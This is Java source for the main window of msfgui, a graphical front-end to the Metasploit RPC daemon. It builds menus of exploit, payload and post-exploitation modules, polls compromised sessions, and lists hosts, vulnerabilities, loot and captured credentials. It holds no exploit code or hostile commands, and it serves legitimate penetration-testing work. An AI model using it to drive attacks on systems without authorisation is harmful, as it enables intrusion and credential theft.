/*
 * MainFrame.java
 */
package msfgui;

import java.awt.Component;
import java.awt.HeadlessException;
import org.jdesktop.application.*;
import java.awt.event.*;
import java.io.*;
import java.net.URI;
import java.net.URISyntaxException;
import java.util.Map;
import java.util.HashMap;
import java.util.TreeMap;
import java.util.ArrayList;
import java.util.List;
import javax.swing.Timer;
import javax.swing.Icon;
import javax.swing.JComponent;
import javax.swing.JDialog;
import javax.swing.JFileChooser;
import javax.swing.JLabel;
import javax.swing.JMenu;
import javax.swing.JMenuItem;
import javax.swing.JOptionPane;
import javax.swing.JPopupMenu;
import org.jdesktop.application.Task;
import org.jdesktop.swingworker.SwingWorker;

/** The application's main frame. */
public class MainFrame extends FrameView {
	public static final int MENU_SIZE_LIMIT = 25;

	public HashMap sessionWindowMap;
	public RpcConnection rpcConn;
	private SwingWorker sessionsPollTimer = null;
	private SessionsTable sessionsTableModel;
	private JPopupMenu jobPopupMenu, shellPopupMenu, meterpreterPopupMenu, sessionPopupMenu;
	private String clickedJob;
	public Map[] selectedSessions;
	private MsfTable[] tables;
	private SearchWindow searchWin;
	private javax.swing.JTable eventsTable;
	private javax.swing.JScrollPane eventsPane;

	public MainFrame(SingleFrameApplication app) {
		super(app);
		MsfFrame.setLnF();
		initComponents();
		sessionsTableModel = null;
		sessionWindowMap = new HashMap();

		//Set up action for starting RPC
		startRpcMenuItem.setAction(getContext().getActionMap(this).get("startRpc"));
		startRpcMenuItem.setMnemonic('S');
		org.jdesktop.application.ResourceMap resources = org.jdesktop.application.Application.getInstance(
				msfgui.MsfguiApp.class).getContext().getResourceMap(MainFrame.class);
		startRpcMenuItem.setText(resources.getString("startRpcMenuItem.text")); 
		
		// status bar initialization - message timeout, idle icon and busy animation, etc
		ResourceMap resourceMap = getResourceMap();
		int messageTimeout = resourceMap.getInteger("StatusBar.messageTimeout");
		messageTimer = new Timer(messageTimeout, new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				statusMessageLabel.setText("");
			}
		});
		messageTimer.setRepeats(false);
		int busyAnimationRate = resourceMap.getInteger("StatusBar.busyAnimationRate");
		for (int i = 0; i < busyIcons.length; i++) 
			busyIcons[i] = resourceMap.getIcon("StatusBar.busyIcons[" + i + "]");
		busyIconTimer = new Timer(busyAnimationRate, new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				busyIconIndex = (busyIconIndex + 1) % busyIcons.length;
				statusAnimationLabel.setIcon(busyIcons[busyIconIndex]);
			}
		});
		idleIcon = resourceMap.getIcon("StatusBar.idleIcon");
		statusAnimationLabel.setIcon(idleIcon);
		progressBar.setVisible(false);

		// connecting action tasks to status bar via TaskMonitor
		TaskMonitor taskMonitor = new TaskMonitor(getApplication().getContext());
		taskMonitor.addPropertyChangeListener(new java.beans.PropertyChangeListener() {
			public void propertyChange(java.beans.PropertyChangeEvent evt) {
				String propertyName = evt.getPropertyName();
				if ("started".equals(propertyName)) {
					if (!busyIconTimer.isRunning()) {
						statusAnimationLabel.setIcon(busyIcons[0]);
						busyIconIndex = 0;
						busyIconTimer.start();
					}
					progressBar.setVisible(true);
					progressBar.setIndeterminate(true);
				} else if ("done".equals(propertyName)) {
					busyIconTimer.stop();
					statusAnimationLabel.setIcon(idleIcon);
					progressBar.setVisible(false);
					progressBar.setValue(0);
				} else if ("message".equals(propertyName)) {
					String text = (String)(evt.getNewValue());
					statusMessageLabel.setText((text == null) ? "" : text);
					messageTimer.restart();
				} else if ("progress".equals(propertyName)) {
					int value = (Integer)(evt.getNewValue());
					progressBar.setVisible(true);
					progressBar.setIndeterminate(false);
					progressBar.setValue(value);
				}
			}
		});
		//Set up GUI, RPC connection, and recent modules
		connectRpc(); // Connect to RPC daemon
		setupPopupMenus();
		if(rpcConn != null)
			handleNewRpcConnection();
		MsfguiApp.fileChooser = new JFileChooser();
		getFrame().addWindowListener(new WindowAdapter() {
			public void windowClosing(WindowEvent we) {
				if(!MsfguiApp.shuttingDown && !confirmStop())
					throw new RuntimeException("Closing aborted.");
			}
		});
		//Events pane
		eventsPane = new javax.swing.JScrollPane();
		eventsTable = new MsfTable(rpcConn, new String [] {"Host", "Created", "Updated", "Name", "Critical", "Username", "Info"
								}, "events", new String[]{"host","created_at","updated_at","name","critical","username", "info"});
		eventsTable.setName("eventsTable"); // NOI18N
		eventsPane.setViewportView(eventsTable);// Create a scrollable text area
		tabbedPane.addTab("Events", eventsPane); // NOI18N
		//Setup icon
		this.getFrame().setIconImage( resourceMap.getImageIcon("main.icon").getImage());
		//Disable tabs by default
		for(int i = 2; i < tabbedPane.getTabCount(); i++)
			tabbedPane.setEnabledAt(i, false);
		Map props = MsfguiApp.getPropertiesNode();
		if(!props.containsKey("tabWindowPreference"))
			props.put("tabWindowPreference", "tab");
		if(props.containsKey("tabLayout")){
			Component realigned = DraggableTabbedPane.restoreSplitLayout(
					props.get("tabLayout"), mainPanel, (DraggableTabbedPane)tabbedPane);
			if(realigned != null){
				mainPanel.removeAll();
				mainPanel.setLayout(new java.awt.GridLayout());
				mainPanel.add(realigned);
			}
		}
		MsfFrame.updateSizes(getFrame());
		this.tables = new MsfTable[]{(MsfTable)eventsTable, (MsfTable)hostsTable,
			(MsfTable)clientsTable, (MsfTable)servicesTable, (MsfTable)vulnsTable,
			(MsfTable)notesTable, (MsfTable)lootsTable, (MsfTable)credsTable};
		// Setup table autoquery code
		((MsfTable)eventsTable).addAutoAdjuster(eventsPane);
		((MsfTable)hostsTable).addAutoAdjuster(hostsPane);
		((MsfTable)clientsTable).addAutoAdjuster(clientsPane);
		((MsfTable)servicesTable).addAutoAdjuster(servicesPane);
		((MsfTable)vulnsTable).addAutoAdjuster(vulnsPane);
		((MsfTable)notesTable).addAutoAdjuster(notesPane);
		((MsfTable)lootsTable).addAutoAdjuster(lootsPane);
		((MsfTable)credsTable).addAutoAdjuster(credsPane);
	}
	/** Before exit, check whether the daemon should be stopped or just the session terminated */
	private boolean confirmStop() {
		if (rpcConn == null)
			return true;
		try {
			int choice = JOptionPane.showConfirmDialog(getFrame(), "Stop msfrpcd?");
			if(choice != JOptionPane.YES_OPTION && choice != JOptionPane.NO_OPTION)
				return false;
			MsfguiApp.shuttingDown = true;
			if(choice == JOptionPane.YES_OPTION)
				rpcConn.execute("core.stop");
			else if(choice == JOptionPane.NO_OPTION && rpcConn.username.length() > 0)
				rpcConn.execute("auth.logout");
		} catch (Exception ex) {
		}
		// TEST TEST
		Object m = DraggableTabbedPane.getSplitLayout(getFrame().getContentPane().getComponent(0));
		MsfguiApp.getPropertiesNode().put("tabLayout", m);
		return true;
	}
	/** Adds window and menu items for reopening and closing the console */
	public void registerConsole(Map res, boolean show, String initVal) {
		registerConsole(res,show,new InteractWindow(rpcConn, res, "console", initVal));
	}
	/** Adds menu items for reopening and closing the console */
	public void registerConsole(Map res, boolean show, final InteractWindow iw) {
		if(show){
			DraggableTabbedPane.show(iw.mainPanel);
			if(MsfguiApp.getPropertiesNode().get("tabWindowPreference").equals("tab"))
				((DraggableTabbedPane)iw.tabbedPane).moveTabTo(0, DraggableTabbedPane.getTabPane(sessionsPane));
			iw.activate();
		}
		final String id = res.get("id").toString();
		final JMenuItem openItem = new JMenuItem(id);
		existingConsoleMenu.add(openItem);
		openItem.addActionListener(new RpcAction() {
			public void action() throws Exception {
				DraggableTabbedPane.show(iw.mainPanel);
			}
		});
		final JMenuItem closeItem = new JMenuItem(id);
		this.closeConsoleMenu.add(closeItem);
		closeItem.addActionListener(new RpcAction() {
			public void action() throws Exception {
				iw.setVisible(false);
				iw.dispose();
				rpcConn.execute("console.destroy", id);
				existingConsoleMenu.remove(openItem);
				closeConsoleMenu.remove(closeItem);
			}
		});
	}

	/** Set up auto session and job refresh */
	private void setupSessionsPollTimer() throws HeadlessException {
		sessionsPollTimer = new SwingWorker(){
			@Override
			protected List doInBackground() throws Exception {
				int delay = 500;
				while(true){
					try {
						Thread.sleep(delay);
						//update sessions
						Map slist = (Map) rpcConn.execute("session.list");
						if(statusMessageLabel.getText().contains("timed out"))
							publish(""); // If last attempt was a timeout, reset since we're rollin again
						ArrayList sessionList = new ArrayList();
						for (Object sid : slist.keySet()) {
							Map session = (Map) slist.get(sid);
							session.put("id", sid);
							MsfguiLog.defaultLog.logSession(session);
							sessionList.add(slist.get(sid));
							//Make a window for the console if we need one and don't have it
							if((session.get("type").equals("meterpreter") || session.get("type").equals("shell"))
									&& sessionWindowMap.get(session.get("id")+"console") == null){
								InteractWindow win = new InteractWindow(rpcConn, session, session.get("type").toString());
								if(MsfguiApp.getPropertiesNode().get("tabWindowPreference").equals("tab")){
									((DraggableTabbedPane)win.tabbedPane).moveTabTo(0, DraggableTabbedPane.getTabPane(sessionsPane));
									win.activate();
								}
								sessionWindowMap.put(session.get("id")+"console", win.mainPanel);
								sessionWindowMap.put(session.get("id")+"lock", win.lock);
							}
						}
						MsfguiLog.defaultLog.checkSessions(slist);//Alert the logger
						if (sessionsTableModel == null) {
							sessionsTableModel = new SessionsTable(sessionList);
							sessionsTable.setModel(sessionsTableModel);
						} else {
							publish(sessionList);
						}
						//Update jobs
						Map jlist = (Map) ((Map)rpcConn.execute("job.list"));
						if(jlist.containsKey("jobs"))
							jlist = (Map)jlist.get("jobs");
						TreeMap orderedJobsList = new TreeMap();
						orderedJobsList.putAll(jlist);
						int i = 0;
						String[] jobStrings = new String[jlist.size()];
						for (Object jid : orderedJobsList.keySet()) {
							jobStrings[i] = jid.toString() + " - " + orderedJobsList.get(jid).toString();
							i++;
						}
						publish((Object)jobStrings);
					} catch (MsfException msfEx) {
						if(!MsfguiApp.shuttingDown || !msfEx.getMessage().contains("Connection refused"))
							msfEx.printStackTrace();
						publish("Error getting session list "+msfEx);
						if(!msfEx.getMessage().contains("timed out")) // on timeout, just retry
							return new ArrayList();
						else
							publish("Timeout getting session list. Retrying...");
					} catch (InterruptedException iex){
					}
				}
			}
			// Receives data from polling thread and updates sessions and jobs.
			@Override
			protected void process(List lis){
				for(Object o : lis){
					if(o instanceof List){
						sessionsTableModel.updateSessions((List)o);
						TableHelper.fitColumnWidths(sessionsTableModel,sessionsTable);
						sessionsTable.updateUI();
					}else if (o instanceof String[]){
						int indx = jobsList.getSelectedIndex();
						jobsList.setListData((String[])o);
						jobsList.setSelectedIndex(indx);
					}else if (o instanceof String){
						statusMessageLabel.setText(o.toString());
					}
				}
			}
		};
	}

   /**
	* Makes a menu tree from a list of modules, and sets action
	* listeners from the given factory.
	* @param mlist List of modules.
	* @param rootMenu Base menu to build tree off of.
	* @param factory Factory to generate handlers to do the actions.
	*/
	private void expandList(List mlist, JMenu rootMenu, RunMenuFactory factory, String type) {
		long currentTime = java.util.Calendar.getInstance().getTimeInMillis();

		//Make sure modDates object is initialized
		Map modDates;
		Object mdo = MsfguiApp.getPropertiesNode().get("modDates");
		if(mdo == null){
			modDates = new HashMap();
			MsfguiApp.getPropertiesNode().put("modDates", modDates);
		}else{
			modDates = (Map)mdo;
		}

		//Update status bar
		statusAnimationLabel.setText(statusAnimationLabel.getText()+mlist.size() + " "+type+" ");

		//Display sorted list
		java.util.Collections.sort(mlist);
		for (Object fullName : mlist) {
			//add to dates hash
			Object time = modDates.get(fullName);
			if(time == null)
				modDates.put(fullName, currentTime);
			boolean recentlyAdded = Long.parseLong(modDates.get(fullName).toString()) >= currentTime - 604800000;//one week

			//Create or find menu for each element of module name
			String[] names = fullName.toString().split("/");
			JMenu currentMenu = rootMenu;
nameloop:	for (int i = 0; i < names.length; i++) {
				boolean found = false;
				Component[] comps = currentMenu.getMenuComponents();

				boolean searchNext = true;
				while(searchNext){ //if "More..." listed, search through more list
					if(recentlyAdded)
						currentMenu.setFont(currentMenu.getFont().deriveFont(currentMenu.getFont().getStyle() | java.awt.Font.BOLD));
					searchNext = false;
					Component [] compsCopy = comps;
					for (Component menu : compsCopy) {
						if (menu.getName().equals(names[i]) && menu instanceof JMenu) {
							if (i < names.length - 1) 
								currentMenu = (JMenu) menu;
							continue nameloop;
						}else if (menu.getName().equals("More...")){
							searchNext = true;
							comps = ((JMenu)menu).getMenuComponents();
							currentMenu = (JMenu) menu;
						}
					}
				}
				//Create new menu element
				if(comps.length > MENU_SIZE_LIMIT){ //extend if necessary
					JMenu extention = new JMenu("More...");
					extention.setName("More...");
					currentMenu.add(extention);
					currentMenu = extention;
				}
				if (i < names.length - 1) {
					JMenu men = new JMenu(names[i]);
					men.setName(names[i]);
					currentMenu.add(men);
					currentMenu = (JMenu) men;
				} else {
					try{
						JMenuItem men = new JMenuItem(names[i]);
						if(recentlyAdded)
							men.setFont(men.getFont().deriveFont(men.getFont().getStyle() | java.awt.Font.BOLD));
						men.setName(names[i]);
						currentMenu.add(men);
						ActionListener actor = factory.getActor(fullName.toString(),type,rpcConn);
						men.addActionListener(actor);
						searchWin.modules.add(new Object[]{type, fullName.toString(),actor});
					}catch(ClassCastException cce){
						System.err.println(names[i]);
						cce.printStackTrace();
					}
				}
			}//end for each subname
		}//end for each module
		rootMenu.setEnabled(true);
	}//end expandList()

   /** Displays info including version */
	@Action
	public void showAboutBox() {
		MsfguiAboutBox.show(getFrame(), rpcConn);
	}

   /** Makes a menu tree with expandList for exploits and auxiliary. Also start jobs/sessions watcher. */
	public void refreshConsoles(){
		existingConsoleMenu.removeAll();
		closeConsoleMenu.removeAll();
		//Setup consoles
		try{
			List consoles = (List) ((Map)rpcConn.execute("console.list")).get("consoles");
			for (Object console : consoles)
				registerConsole((Map)console,false, "");
		}catch (MsfException mex){
			MsfguiApp.showMessage(getFrame(), mex);
		}
	}

   /** Makes a menu tree with expandList for exploits and auxiliary. Also start jobs/sessions watcher. */
	public void handleNewRpcConnection() {
		setupSessionsPollTimer();
		searchWin = new SearchWindow(rpcConn);
		MsfguiApp.addRecentModules(rpcConn, this);
		getContext().getActionMap(this).get("moduleTask").actionPerformed(new java.awt.event.ActionEvent(this,1234,""));
	}

	/** helper for getModules - does the work */
	@Action
	public Task moduleTask(){
		return new Task<Void, Void>(getApplication()){
			@Override
			protected Void doInBackground() throws Exception {
				setTitle("Connected to running msfrpcd. Getting module lists.");
				setProgress(0.0f);
				//Get modules lists
				try {
					// yeah three layer deep nested inner classes sucks but I hate making new files for each one
					RunMenuFactory moduleFactory =  new RunMenuFactory(){
						public ActionListener getActor(final String modName, final String type, final RpcConnection rpcConn) {
							return new ActionListener(){
								public void actionPerformed(ActionEvent e) {
									//If we have saved options for this module, use those
									Object modOptions = MsfguiApp.getPropertiesNode().get("modOptions");
									if(modOptions != null && ((Map)modOptions).containsKey(type+" "+modName))
										new ModulePopup(rpcConn, ((List)((Map)modOptions).get(type+" "+modName)).toArray(), MainFrame.this).setVisible(true);
									else //otherwise go with the default
										new ModulePopup(modName,rpcConn,type, MainFrame.this).setVisible(true);
								}
							};
						}
					};
					//Exploits and auxiliary get modulepopups; payloads get payloadpopups duh
					setMessage("Getting exploits");
					statusAnimationLabel.setText("");
					expandList((List) ((Map)rpcConn.execute("module.exploits")).get("modules"), exploitsMenu, moduleFactory, "exploit");
					setProgress(0.3f);
					setMessage("Getting auxiliary modules");
					expandList((List) ((Map)rpcConn.execute("module.auxiliary")).get("modules"), auxiliaryMenu, moduleFactory, "auxiliary");
					setProgress(0.5f);
					setMessage("Getting payloads");
					expandList((List) ((Map)rpcConn.execute("module.payloads")).get("modules"), payloadsMenu, new RunMenuFactory(){
						public ActionListener getActor(final String modName, final String type, final RpcConnection rpcConn) {
							return new ActionListener() {
								public void actionPerformed(ActionEvent e) {
									new PayloadPopup(modName, rpcConn, MainFrame.this).setVisible(true);
								}
							};
						}
					}, "payload");
					setProgress(0.7f);
					setMessage("Getting post modules");
					JMenu postModMenu = new JMenu("Modules");
					meterpreterPopupMenu.add(postModMenu,4);
					expandList((List) ((Map)rpcConn.execute("module.post")).get("modules"), postModMenu, moduleFactory, "post");
					setProgress(0.85f);
					postMenu.setEnabled(true);

					setMessage("Finding open consoles");
					refreshConsoles();
					consoleMenu.setEnabled(true);

					setMessage("Querying database...");
					//First try to connect to the database
					DbConnectDialog.tryConnect(getFrame(), rpcConn);
					reloadDb(true);
					//Find a database pane, and see if it is enabled (db successfuly loaded)
					DraggableTabbedPane credsDTP = DraggableTabbedPane.getTabPane(credsPane);
					if(MainFrame.this.closeConsoleMenu.getItemCount() == 0 &&
							credsDTP.isEnabledAt(credsDTP.indexOfComponent(credsPane))){
						registerConsole( (Map)rpcConn.execute("console.create"), false, "");
						reloadDb(true);
					}
					setProgress(0.95f);
					databaseMenu.setEnabled(true);
					pluginsMenu.setEnabled(true);
					setProgress(1.0f);
				} catch (MsfException ex) {
					statusAnimationLabel.setText("Error getting module lists. " + ex);
				}
				return null;
			}

			@Override
			protected void succeeded(Void blah) {
				sessionsPollTimer.execute();
				statusAnimationLabel.setText(statusAnimationLabel.getText()+"modules");
				setMessage("");
			}
		};
	}

	/** This method is called from within the constructor to
	 * initialize the form.
	 * WARNING: Do NOT modify this code. The content of this method is
	 * always regenerated by the Form Editor.
	 */
	@SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:initComponents
    private void initComponents() {

        mainPanel = new javax.swing.JPanel();
        tabbedPane = new DraggableTabbedPane(getFrame());
        jobsPane = new javax.swing.JScrollPane();
        jobsList = new javax.swing.JList();
        sessionsPane = new javax.swing.JScrollPane();
        sessionsTable = new javax.swing.JTable();
        hostsPane = new javax.swing.JScrollPane();
        hostsTable = new MsfTable(rpcConn, new String [] {"Created", "Address", "Address6", "MAC", "Name", "State", "OS name", "OS flavor", "OS SP", "OS lang", "Updated", "Purpose", "Info"}
            , "hosts",new String[]{"created_at", "address", "address6", "mac", "name", "state", "os_name", "os_flavor", "os_sp", "os_lang", "updated_at", "purpose", "info"});
        clientsPane = new javax.swing.JScrollPane();
        clientsTable = new MsfTable(rpcConn, new String [] {"Host", "UA String", "UA Name", "UA Ver", "Created", "Updated"}
            , "clients", new String[]{"host", "ua_string", "ua_name", "ua_ver", "created_at", "updated_at"});
        servicesPane = new javax.swing.JScrollPane();
        servicesTable = new MsfTable(rpcConn, new String [] {"Host", "Created", "Updated", "Port", "Proto", "State", "Name", "Info"}
            , "services", new String[]{"host", "created_at", "updated_at", "port", "proto", "state", "name", "info"});
        vulnsPane = new javax.swing.JScrollPane();
        vulnsTable = new MsfTable(rpcConn, new String [] {"Port", "Proto", "Time", "Host", "Name", "Refs"
        }, "vulns", new String[]{"port", "proto", "time", "host", "name", "refs"});
        notesPane = new javax.swing.JScrollPane();
        notesTable = new MsfTable(rpcConn, new String [] {"Time", "Host", "Service", "Type", "Data"
        }, "notes", new String[]{"time", "host", "service", "type", "data"});
        lootsPane = new javax.swing.JScrollPane();
        lootsTable = new MsfTable(rpcConn,new String [] {"Host", "Service", "Ltype", "Ctype", "Data", "Created", "Updated", "Name", "Info"
        }, "loots", new String[]{"host", "service", "ltype", "ctype", "data", "created_at", "updated_at", "name", "info"});
        credsPane = new javax.swing.JScrollPane();
        credsTable = new MsfTable(rpcConn, new String [] {"Host", "Updated", "Port", "Proto", "Sname", "Type", "User", "Pass", "Active"
        }, "creds", new String[]{"host", "updated_at", "port", "proto", "sname", "type", "user", "pass", "active"});
        menuBar = new javax.swing.JMenuBar();
        javax.swing.JMenu fileMenu = new javax.swing.JMenu();
        connectRpcMenuItem = new javax.swing.JMenuItem();
        startRpcMenuItem = new javax.swing.JMenuItem();
        showDetailsItem = new javax.swing.JMenuItem();
        jSeparator1 = new javax.swing.JPopupMenu.Separator();
        searchItem = new javax.swing.JMenuItem();
        javax.swing.JMenuItem exitMenuItem = new javax.swing.JMenuItem();
        viewMenu = new javax.swing.JMenu();
        viewPrefsItem = new javax.swing.JMenuItem();
        jobViewItem = new javax.swing.JMenuItem();
        sessionsViewItem = new javax.swing.JMenuItem();
        hostsViewItem = new javax.swing.JMenuItem();
        clientsViewItem = new javax.swing.JMenuItem();
        servicesViewItem = new javax.swing.JMenuItem();
        vulnsViewItem = new javax.swing.JMenuItem();
        eventsViewItem = new javax.swing.JMenuItem();
        notesViewItem = new javax.swing.JMenuItem();
        credsViewItem = new javax.swing.JMenuItem();
        lootsViewItem = new javax.swing.JMenuItem();
        exploitsMenu = new javax.swing.JMenu();
        auxiliaryMenu = new javax.swing.JMenu();
        payloadsMenu = new javax.swing.JMenu();
        historyMenu = new javax.swing.JMenu();
        recentMenu = new javax.swing.JMenu();
        clearHistoryItem = new javax.swing.JMenuItem();
        postMenu = new javax.swing.JMenu();
        menuRunAllMeterp = new javax.swing.JMenu();
        crackPasswordsItem = new javax.swing.JMenuItem();
        killSessionsMenuItem = new javax.swing.JMenuItem();
        logGenerateMenuItem = new javax.swing.JMenuItem();
        consoleMenu = new javax.swing.JMenu();
        newConsoleItem = new javax.swing.JMenuItem();
        existingConsoleMenu = new javax.swing.JMenu();
        closeConsoleMenu = new javax.swing.JMenu();
        refreshConsolesItem = new javax.swing.JMenuItem();
        databaseMenu = new javax.swing.JMenu();
        connectItem = new javax.swing.JMenuItem();
        disconnectItem = new javax.swing.JMenuItem();
        refreshItem = new javax.swing.JMenuItem();
        nmapItem = new javax.swing.JMenuItem();
        importItem = new javax.swing.JMenuItem();
        dbExportItem = new javax.swing.JMenuItem();
        currWorkspaceItem = new javax.swing.JMenuItem();
        addWorkspaceItem = new javax.swing.JMenuItem();
        delWorkspaceItem = new javax.swing.JMenuItem();
        pluginsMenu = new javax.swing.JMenu();
        autoAddRouteItem = new javax.swing.JMenuItem();
        soundItem = new javax.swing.JMenuItem();
        dbCredcollectItem = new javax.swing.JMenuItem();
        dbTrackerItem = new javax.swing.JMenuItem();
        socketLoggerItem = new javax.swing.JMenuItem();
        ipsFilterItem = new javax.swing.JMenuItem();
        otherPluginItem = new javax.swing.JMenuItem();
        unloadPluginItem = new javax.swing.JMenuItem();
        helpMenu = new javax.swing.JMenu();
        onlineHelpMenu = new javax.swing.JMenuItem();
        javax.swing.JMenuItem aboutMenuItem = new javax.swing.JMenuItem();
        statusPanel = new javax.swing.JPanel();
        statusMessageLabel = new javax.swing.JLabel();
        statusAnimationLabel = new javax.swing.JLabel();
        progressBar = new javax.swing.JProgressBar();

        mainPanel.setName("mainPanel"); // NOI18N

        tabbedPane.setMinimumSize(new java.awt.Dimension(77, 50));
        tabbedPane.setName("tabbedPane"); // NOI18N

        jobsPane.setName("jobsPane"); // NOI18N
        jobsPane.setPreferredSize(new java.awt.Dimension(10, 10));

        jobsList.setName("jobsList"); // NOI18N
        jobsPane.setViewportView(jobsList);

        org.jdesktop.application.ResourceMap resourceMap = org.jdesktop.application.Application.getInstance(msfgui.MsfguiApp.class).getContext().getResourceMap(MainFrame.class);
        tabbedPane.addTab(resourceMap.getString("jobsPane.TabConstraints.tabTitle"), jobsPane); // NOI18N

        sessionsPane.setName("sessionsPane"); // NOI18N

        sessionsTable.setModel(new javax.swing.table.DefaultTableModel(
            new Object [][] {

            },
            new String [] {

            }
        ));
        sessionsTable.setName("sessionsTable"); // NOI18N
        sessionsTable.setSelectionMode(javax.swing.ListSelectionModel.MULTIPLE_INTERVAL_SELECTION);
        sessionsTable.setAutoCreateRowSorter(true);
        sessionsPane.setViewportView(sessionsTable);

        tabbedPane.addTab(resourceMap.getString("sessionsPane.TabConstraints.tabTitle"), sessionsPane); // NOI18N

        hostsPane.setName("hostsPane"); // NOI18N

        hostsTable.setName("hostsTable"); // NOI18N
        hostsTable.addKeyListener(new java.awt.event.KeyAdapter() {
            public void keyReleased(java.awt.event.KeyEvent evt) {
                hostsTableKeyReleased(evt);
            }
        });
        hostsPane.setViewportView(hostsTable);

        tabbedPane.addTab(resourceMap.getString("hostsPane.TabConstraints.tabTitle"), hostsPane); // NOI18N

        clientsPane.setName("clientsPane"); // NOI18N

        clientsTable.setName("clientsTable"); // NOI18N
        clientsTable.addKeyListener(new java.awt.event.KeyAdapter() {
            public void keyReleased(java.awt.event.KeyEvent evt) {
                clientsTableKeyReleased(evt);
            }
        });
        clientsPane.setViewportView(clientsTable);

        tabbedPane.addTab(resourceMap.getString("clientsPane.TabConstraints.tabTitle"), clientsPane); // NOI18N

        servicesPane.setName("servicesPane"); // NOI18N

        servicesTable.setName("servicesTable"); // NOI18N
        servicesTable.addKeyListener(new java.awt.event.KeyAdapter() {
            public void keyReleased(java.awt.event.KeyEvent evt) {
                servicesTableKeyReleased(evt);
            }
        });
        servicesPane.setViewportView(servicesTable);

        tabbedPane.addTab(resourceMap.getString("servicesPane.TabConstraints.tabTitle"), servicesPane); // NOI18N

        vulnsPane.setName("vulnsPane"); // NOI18N

        vulnsTable.setName("vulnsTable"); // NOI18N
        vulnsTable.addKeyListener(new java.awt.event.KeyAdapter() {
            public void keyReleased(java.awt.event.KeyEvent evt) {
                vulnsTableKeyReleased(evt);
            }
        });
        vulnsPane.setViewportView(vulnsTable);

        tabbedPane.addTab(resourceMap.getString("vulnsPane.TabConstraints.tabTitle"), vulnsPane); // NOI18N

        notesPane.setName("notesPane"); // NOI18N

        notesTable.setName("notesTable"); // NOI18N
        notesTable.addKeyListener(new java.awt.event.KeyAdapter() {
            public void keyReleased(java.awt.event.KeyEvent evt) {
                notesTableKeyReleased(evt);
            }
        });
        notesPane.setViewportView(notesTable);

        tabbedPane.addTab(resourceMap.getString("notesPane.TabConstraints.tabTitle"), notesPane); // NOI18N

        lootsPane.setName("lootsPane"); // NOI18N

        lootsTable.setName("lootsTable"); // NOI18N
        lootsTable.addKeyListener(new java.awt.event.KeyAdapter() {
            public void keyReleased(java.awt.event.KeyEvent evt) {
                lootsTableKeyReleased(evt);
            }
        });
        lootsPane.setViewportView(lootsTable);

        tabbedPane.addTab(resourceMap.getString("lootsPane.TabConstraints.tabTitle"), lootsPane); // NOI18N

        credsPane.setName("credsPane"); // NOI18N

        credsTable.setName("credsTable"); // NOI18N
        credsPane.setViewportView(credsTable);

        tabbedPane.addTab(resourceMap.getString("credsPane.TabConstraints.tabTitle"), credsPane); // NOI18N

        javax.swing.GroupLayout mainPanelLayout = new javax.swing.GroupLayout(mainPanel);
        mainPanel.setLayout(mainPanelLayout);
        mainPanelLayout.setHorizontalGroup(
            mainPanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(tabbedPane, javax.swing.GroupLayout.DEFAULT_SIZE, 882, Short.MAX_VALUE)
        );
        mainPanelLayout.setVerticalGroup(
            mainPanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(tabbedPane, javax.swing.GroupLayout.Alignment.TRAILING, javax.swing.GroupLayout.DEFAULT_SIZE, 534, Short.MAX_VALUE)
        );

        menuBar.setName("menuBar"); // NOI18N

        fileMenu.setMnemonic('F');
        fileMenu.setText(resourceMap.getString("fileMenu.text")); // NOI18N
        fileMenu.setName("fileMenu"); // NOI18N

        connectRpcMenuItem.setMnemonic('C');
        connectRpcMenuItem.setText(resourceMap.getString("connectRpcMenuItem.text")); // NOI18N
        connectRpcMenuItem.setName("connectRpcMenuItem"); // NOI18N
        connectRpcMenuItem.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                connectRpcMenuItemActionPerformed(evt);
            }
        });
        fileMenu.add(connectRpcMenuItem);

        startRpcMenuItem.setMnemonic('S');
        startRpcMenuItem.setText(resourceMap.getString("startRpcMenuItem.text")); // NOI18N
        startRpcMenuItem.setName("startRpcMenuItem"); // NOI18N
        fileMenu.add(startRpcMenuItem);

        showDetailsItem.setMnemonic('d');
        showDetailsItem.setText(resourceMap.getString("showDetailsItem.text")); // NOI18N
        showDetailsItem.setName("showDetailsItem"); // NOI18N
        showDetailsItem.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                showDetailsItemActionPerformed(evt);
            }
        });
        fileMenu.add(showDetailsItem);

        jSeparator1.setName("jSeparator1"); // NOI18N
        fileMenu.add(jSeparator1);

        searchItem.setText(resourceMap.getString("searchItem.text")); // NOI18N
        searchItem.setName("searchItem"); // NOI18N
        searchItem.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                searchItemActionPerformed(evt);
            }
        });
        fileMenu.add(searchItem);

        javax.swing.ActionMap actionMap = org.jdesktop.application.Application.getInstance(msfgui.MsfguiApp.class).getContext().getActionMap(MainFrame.class, this);
        exitMenuItem.setAction(actionMap.get("quit")); // NOI18N
        exitMenuItem.setName("exitMenuItem"); // NOI18N
        exitMenuItem.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                exitMenuItemActionPerformed(evt);
            }
        });
        fileMenu.add(exitMenuItem);

        menuBar.add(fileMenu);

        viewMenu.setMnemonic('V');
        viewMenu.setText(resourceMap.getString("viewMenu.text")); // NOI18N
        viewMenu.setName("viewMenu"); // NOI18N

        viewPrefsItem.setMnemonic('P');
        viewPrefsItem.setText(resourceMap.getString("viewPrefsItem.text")); // NOI18N
        viewPrefsItem.setName("viewPrefsItem"); // NOI18N
        viewPrefsItem.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                viewPrefsItemActionPerformed(evt);
            }
        });
        viewMenu.add(viewPrefsItem);

        jobViewItem.setMnemonic('J');
        jobViewItem.setText(resourceMap.getString("jobViewItem.text")); // NOI18N
        jobViewItem.setName("jobViewItem"); // NOI18N
        jobViewItem.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jobViewItemActionPerformed(evt);
            }
        });
        viewMenu.add(jobViewItem);

        sessionsViewItem.setMnemonic('s');
        sessionsViewItem.setText(resourceMap.getString("sessionsViewItem.text")); // NOI18N
        sessionsViewItem.setName("sessionsViewItem"); // NOI18N
